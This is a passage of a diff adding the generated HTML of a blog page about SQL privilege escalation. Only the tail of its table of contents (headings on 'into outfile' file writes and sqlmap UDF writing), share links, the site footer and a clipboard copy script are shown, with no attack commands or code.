class="toc-item toc-level-4"><a class="toc-link" href="#1-into-outfile-直接写入"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">1. into outfile 直接写入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-表内容导出写入"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">2. 表内容导出写入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-sqlmap写入UDF"><span class="toc-number">1.3.</span> <span class="toc-text">3.sqlmap写入UDF</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/09/27/SQLPrivilgeEscalation/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/09/27/SQLPrivilgeEscalation/&text=SQLPrivilgeEscalation" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/09/27/SQLPrivilgeEscalation/&title=SQLPrivilgeEscalation" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/09/27/SQLPrivilgeEscalation/&is_video=false&description=SQLPrivilgeEscalation" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SQLPrivilgeEscalation&body=Check out this article: http://yoursite.com/2020/09/27/SQLPrivilgeEscalation/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/09/27/SQLPrivilgeEscalation/&title=SQLPrivilgeEscalation" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/09/27/SQLPrivilgeEscalation/&title=SQLPrivilgeEscalation" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/09/27/SQLPrivilgeEscalation/&title=SQLPrivilgeEscalation" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/09/27/SQLPrivilgeEscalation/&title=SQLPrivilgeEscalation" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/09/27/SQLPrivilgeEscalation/&name=SQLPrivilgeEscalation&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/09/27/SQLPrivilgeEscalation/&t=SQLPrivilgeEscalation" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    1970-2020
+    Tansz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
